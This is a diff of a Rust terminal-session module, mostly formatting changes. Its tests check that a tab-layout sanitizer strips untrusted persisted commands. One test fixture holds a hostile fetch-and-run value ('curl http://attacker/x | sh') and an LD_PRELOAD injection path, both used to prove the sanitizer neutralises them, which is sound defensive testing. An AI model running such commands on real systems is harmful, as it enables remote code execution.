@@ -30,7 +30,15 @@ pub fn save_tab_layout(
     sessions: Option<Value>,
     allow_clear: bool,
 ) -> Result<(), String> {
-    write_terminal_session(project_id, local_file, tabs, 0, groups, sessions, allow_clear)
+    write_terminal_session(
+        project_id,
+        local_file,
+        tabs,
+        0,
+        groups,
+        sessions,
+        allow_clear,
+    )
 }
 
 /// Save tab layout with the active tab index (the project-switch snapshot).
@@ -46,7 +54,15 @@ pub fn save_terminal_session(
     // It also never clears: a snapshot is a picture of what was in memory, and an
     // empty one is far more likely to mean "this scope was never loaded" than
     // "the user closed everything" — the debounced save owns that intent.
-    write_terminal_session(project_id, local_file, tabs, active_tab_index, groups, None, false)
+    write_terminal_session(
+        project_id,
+        local_file,
+        tabs,
+        active_tab_index,
+        groups,
+        None,
+        false,
+    )
 }
 
 #[allow(clippy::too_many_arguments)]
@@ -233,7 +249,11 @@ const SCRIPT_INTERP_CMDS: &[&str] = &["sh", "bash", "zsh", "fish", "ksh", "power
 fn known_tab_commands(custom: &HashMap<String, Vec<String>>) -> HashSet<String> {
     let mut set: HashSet<String> = HashSet::new();
     set.insert(String::new());
-    for c in PANE_MARKER_CMDS.iter().chain(AGENT_CMDS).chain(SCRIPT_INTERP_CMDS) {
+    for c in PANE_MARKER_CMDS
+        .iter()
+        .chain(AGENT_CMDS)
+        .chain(SCRIPT_INTERP_CMDS)
+    {
         set.insert((*c).to_string());
     }
     for cmd in custom.keys() {
@@ -270,7 +290,10 @@ fn custom_agent_specs() -> HashMap<String, Vec<String>> {
                         .get("resumeArgs")
                         .and_then(Value::as_array)
                         .map(|v| {
-                            v.iter().filter_map(Value::as_str).map(str::to_string).collect()
+                            v.iter()
+                                .filter_map(Value::as_str)
+                                .map(str::to_string)
+                                .collect()
                         })
                         .unwrap_or_default();
                     Some((cmd.to_string(), resume))
@@ -318,7 +341,14 @@ pub fn sanitize_tab_layout(
         );
         tab.cmd = String::new();
         tab.session_id = None;
-        for key in ["resumeArgs", "env", "location", "args", "agentMode", HOST_BOUND_UID_KEY] {
+        for key in [
+            "resumeArgs",
+            "env",
+            "location",
+            "args",
+            "agentMode",
+            HOST_BOUND_UID_KEY,
+        ] {
             tab.extra.remove(key);
         }
     }
@@ -532,7 +562,10 @@ mod tests {
             "resumeArgs".to_string(),
             serde_json::json!(["-c", "curl http://attacker/x | sh"]),
         );
-        extra.insert("env".to_string(), serde_json::json!({ "LD_PRELOAD": "/tmp/x.so" }));
+        extra.insert(
+            "env".to_string(),
+            serde_json::json!({ "LD_PRELOAD": "/tmp/x.so" }),
+        );
         extra.insert("kind".to_string(), Value::String("local_agent".to_string()));
         TabEntry {
             key: "t1".to_string(),
@@ -547,7 +580,11 @@ mod tests {
     fn known() -> HashSet<String> {
         let mut set: HashSet<String> = HashSet::new();
         set.insert(String::new());
-        for c in PANE_MARKER_CMDS.iter().chain(AGENT_CMDS).chain(SCRIPT_INTERP_CMDS) {
+        for c in PANE_MARKER_CMDS
+            .iter()
+            .chain(AGENT_CMDS)
+            .chain(SCRIPT_INTERP_CMDS)
+        {
             set.insert((*c).to_string());
         }
         set
@@ -600,12 +637,26 @@ mod tests {
 
     #[test]
     fn known_commands_keep_every_field_except_resume_args() {
-        for cmd in ["", "claude", "codex", "vibe", "__eldrun_files__", "__eldrun_mail__", "zsh"] {
+        for cmd in [
+            "",
+            "claude",
+            "codex",
+            "vibe",
+            "__eldrun_files__",
+            "__eldrun_mail__",
+            "zsh",
+        ] {
             let mut tabs = vec![entry(cmd)];
             sanitize_tab_layout(&mut tabs, &known(), &no_custom());
             assert_eq!(tabs[0].cmd, cmd, "'{cmd}' must be accepted verbatim");
-            assert!(tabs[0].session_id.is_some(), "'{cmd}' must keep its session id");
-            assert!(tabs[0].extra.contains_key("location"), "'{cmd}' keeps locality");
+            assert!(
+                tabs[0].session_id.is_some(),
+                "'{cmd}' must keep its session id"
+            );
+            assert!(
+                tabs[0].extra.contains_key("location"),
+                "'{cmd}' keeps locality"
+            );
             assert!(tabs[0].extra.contains_key("env"), "'{cmd}' keeps env");
         }
     }
@@ -614,7 +665,10 @@ mod tests {
     fn a_custom_agent_command_is_accepted_when_registered() {
         let mut tabs = vec![entry("my-agent")];
         sanitize_tab_layout(&mut tabs, &known(), &no_custom());
-        assert_eq!(tabs[0].cmd, "", "unregistered custom command is neutralized");
+        assert_eq!(
+            tabs[0].cmd, "",
+            "unregistered custom command is neutralized"
+        );
 
         let custom = HashMap::from([("my-agent".to_string(), vec!["--continue".to_string()])]);
         let mut tabs = vec![entry("my-agent")];
@@ -629,7 +683,9 @@ mod tests {
         // executed on the HOST (the container is deliberately skipped for them). The
         // frontend rebuilds a built-in's flag from RESUMABLE_AGENTS, so the
         // persisted vector is redundant as well as dangerous.
-        for cmd in ["claude", "codex", "vibe", "opencode", "droid", "openclaw", "ollama"] {
+        for cmd in [
+            "claude", "codex", "vibe", "opencode", "droid", "openclaw", "ollama",
+        ] {
             let mut tabs = vec![entry(cmd)];
             sanitize_tab_layout(&mut tabs, &known(), &no_custom());
             assert_eq!(tabs[0].cmd, cmd);
